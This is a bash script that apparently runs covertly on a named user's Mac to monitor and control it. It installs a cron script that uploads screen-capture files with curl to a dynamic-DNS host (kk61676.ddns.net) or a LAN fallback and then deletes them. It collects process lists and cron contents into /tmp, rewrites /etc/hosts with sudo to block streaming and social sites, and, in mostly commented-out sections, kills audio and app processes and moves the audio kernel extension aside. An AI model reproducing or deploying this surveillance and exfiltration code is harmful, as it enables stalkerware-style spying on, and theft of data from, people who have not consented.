#!/bin/bash

python -m SimpleHTTPServer 8889 &
echo $(date) > /tmp/screen_mac_000_date.txt
ps -ef > /tmp/screen_mac_000_psef.txt

# sudo mv /System/Library/Extensions/IOAudioFamily.kext /tmp/ || true
echo $(date) > /tmp/screen_mac_000_date2.txt

#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I  2>&1 > /tmp/screen_mac_000_airport_I.txt || true

#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s  2>&1 > /tmp/screen_mac_000_airport_s.txt || true

#grep -i sonic  /tmp/screen_mac_000_airport_s.txt &&   sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -z || true

#for i in `seq 1 25`;
#do
#  sudo kill $(ps aux | grep -i 'twitter' | awk '{print $2}') &
#  grep -i sonic  /tmp/screen_mac_000_airport_s.txt && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -z &
#  sleep 2
#done


#exit 0

#  osascript -e "set volume output volume 0 --100%"
#  osascript -e "set Volume 0"


#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
#  echo "uploading $file"
#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
#  # sleep 1
#  rm $file 
#done

read -r -d '' SCRCAP_KK << EOM2
#!/bin/bash
set -ex
sudo killall curl || true
exit 0
find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
  echo "uploading \$file"
  if curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file
  then
    rm -f \$file
  else
    curl -X POST --form file=@\$file http://192.168.111.142:3001/file || break
    rm -f \$file
  fi
done
EOM2

echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
exit 0
cat /Users/Vladdy/Library/Cron/scrcap_kk.sh > /tmp/screen_mac_000_scrcap_kk.sh.txt || true
/Users/Vladdy/Library/Cron/scrcap_kk.sh > /tmp/screen_mac_000_scrcap_kk_log.txt || true

cat /Users/Vladdy/Library/Cron/upload_scrcap.sh > /tmp/screen_mac_000_upload_scrcap.sh.txt || true
cat /Users/Vladdy/Library/Cron/scrcap.sh > /tmp/screen_mac_000_Cron_scrcap.sh.txt || true
cat /Users/Vladdy/Library/Cron/cron.sh > /tmp/screen_mac_000_Cron_cron.sh.txt || true
cat /Users/Vladdy/Library/Cron/offline.sh > /tmp/screen_mac_000_Cron_offline.txt || true

echo $(date) > /tmp/screen_mac_000_date3.txt


sleep 2

ls -la /Users/Vladdy/Library/Cron/ > /tmp/screen_mac_000_uvlc_lsla.txt || true

#networksetup -getairportnetwork en0 > /tmp/screen_mac_000_get_airport_net.txt || true

#sudo ln -s /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport /usr/local/bin/airport || true
#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I  2>&1 > /tmp/screen_mac_000_airport_I.txt || true
#sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s  2>&1 > /tmp/screen_mac_000_airport_s.txt || true
#which airport > /tmp/screen_mac_which_airport.txt || true
#sudo find /System/ | grep airport > /tmp/screen_mac_grep_airport.txt || true

# it is ON from now forever
export FILTER=ON

read -r -d '' FILTER_LIST << EOM
www.netflix.com
twitter.com
afdah.tv
cwtv.com
www.cbs.com
www.twitch.tv
www.amc.com
www.watchepisodes1.tv
putlocker.is
www.mycollection.net
www.vodlocker.city
www.cbs.com
www.fox.com
123movies.to
www.hdmovieswatch.net
putlockerr.ac
abc.go.com
www.nbc.com
www.carsforsale.com
www.instagram.com
www.twitch.tv
twttr.com
www2.twitter.com
www2.twitter.jp
www.facebook.com
www.tbs.com
www.tntdrama.com
play.spotify.com
www.amazon.com
slither.io
sfbay.craigslist.org
craigslist.org
www.xnxx.com
soundcloud.com
www.hiphopengine.com
EOM

# tumblr.com
# www.tumblr.com

echo "$FILTER_LIST" | while read line; do
  echo $line
  if [ "$FILTER" = "ON" ]; then
    sudo bash -c "grep '$line'  /etc/hosts || echo '127.0.0.1  $line' >> /etc/hosts"
    sudo bash -c "sed -i.bak 's/# 127.0.0.1  $line/127.0.0.1  $line/g' /etc/hosts"
  fi
  if [ "$FILTER" = "OFF" ]; then
    sudo bash -c "sed -i.bak 's/^127.0.0.1  $line/# 127.0.0.1  $line/g' /etc/hosts"
  fi
done

exit 0

sudo kill $(ps aux | grep -i 'osascript' | awk '{print $2}') || true
sudo kill $(ps aux | grep -i 'offline.sh' | awk '{print $2}') || true
sudo kill $(ps aux | grep -i 'curl' | awk '{print $2}') || true

for i in `seq 1 25`;
do
#  osascript -e "set volume output volume 0 --100%"
#  osascript -e "set Volume 0"
  sudo kill $(ps aux | grep -i 'coreaudiod' | awk '{print $2}') || true
  sudo kill $(ps aux | grep -i 'instagram' | awk '{print $2}') || true
  sudo kill $(ps aux | grep -i 'twitter' | awk '{print $2}') || true
  sleep 2
done

sudo cat /etc/hosts > /tmp/screen_mac_etc_hosts.txt || true

echo $(date) > /tmp/screen_mac_000_date4.txt

#sudo mv /System/Library/Extensions/IOAudioFamily.kext /tmp/ || true
#sudo ls -la /System/Library/Extensions/ > /tmp/screen_mac_000_sle.txt || true
#sudo ls -la /tmp/ > /tmp/screen_mac_000_tmp.txt || true


#read -r -d '' OFFLINE << EOM3
#!/bin/bash/
#set -ex
#sudo mv /System/Library/Extensions/IOAudioFamily.kext /tmp/ || true
#for i in `seq 1 25`;
#do
#  osascript -e "set volume output volume 0 --100%"
#  osascript -e "set Volume 0"
#  sudo kill $(ps aux | grep -i 'coreaudiod' | awk '{print $2}') || true
#  sudo kill $(ps aux | grep -i 'instagram' | awk '{print $2}') || true
#  sudo kill $(ps aux | grep -i 'twitter' | awk '{print $2}') || true
#  sleep 2
#done
#EOM3

#echo "$OFFLINE" > /Users/Vladdy/Library/Cron/offline.sh || true

#chmod 755 /Users/Vladdy/Library/Cron/offline.sh

#if ! grep "offline.sh" /Users/Vladdy/Library/Cron/cron.sh
#then
#echo "/Users/Vladdy/Library/Cron/offline.sh" >> /Users/Vladdy/Library/Cron/cron.sh
#fi

echo $(date) > /tmp/screen_mac_000_date4.txt
sudo kill -9 $(ps aux | grep -i 'cron.sh' | awk '{print $2}') || true
echo $(date) > /tmp/screen_mac_000_date5.txt
